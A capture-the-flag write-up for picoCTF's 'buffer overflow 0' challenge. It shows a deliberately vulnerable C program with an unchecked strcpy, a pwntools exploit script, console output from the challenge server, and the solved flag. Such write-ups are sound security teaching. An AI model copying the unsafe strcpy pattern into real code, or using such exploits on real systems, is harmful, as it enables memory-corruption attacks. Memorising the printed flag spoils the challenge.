# buffer overflow 0
Binary Exploitation, 150 points

## Description:
> Let's start off simple, can you overflow the right buffer in this program to get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}

```

## Solution:

The program check if any command line arguments were passed to it (`argc > 1`), and if so, passes the first command line as a parameter for `vuln`. 

`vuln` then tries to copy the argument into a local buffer of size 16.

It's easy to see that if we pass an argument longer than 16 bytes, we will overflow the local buffer. If the argument is long enough, we will cause a segmentation fault and trigger the `sigsegv_handler`, printing the flag.

Solving this with pwntools is a bit of an overkill since we can easily just call `./vuln $(python -c "print 'A'*32")`, but it's a nice opportunity to practice.

The code:
```python
from pwn import *
import argparse
import os

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process(ssh_user = None, arguments = None):
    if arguments is None:
        arguments = []
    if type(arguments) is not list:
        raise ValueError("Invalid type for 'arguments' ({}), expecting list or None".format(type(arguments)))
    if ssh_user is not None:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(argv = [REMOTE_PATH + EXECUTABLE] + arguments, cwd = REMOTE_PATH)
    elif os.path.exists(REMOTE_PATH):
        p = process(argv = [REMOTE_PATH + EXECUTABLE] + arguments, cwd = REMOTE_PATH)
    else:
        p = process(argv = [LOCAL_PATH + EXECUTABLE] + arguments, cwd = LOCAL_PATH)
    return p



parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

p = get_process(args.ssh_user, [cyclic(32)])
print p.recvall()
```

Basically, the script just calls the `vuln` process with a string of length 32 (generated using `cyclic`) and prints the response, which contains the flag.

It can do this either over SSH or locally.

```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_0# python exploit.py --ssh_user $pico_ssh_username
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/buffer-overflow-0_0_6461b382721ccca2318b1d981d363924/vuln' on 2018shell3.picoctf.com: pid 27603
[+] Receiving all data: Done (43B)
[*] Stopped remote process 'vuln' on 2018shell3.picoctf.com (pid 27603)
picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}
```

The flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_a54b012c}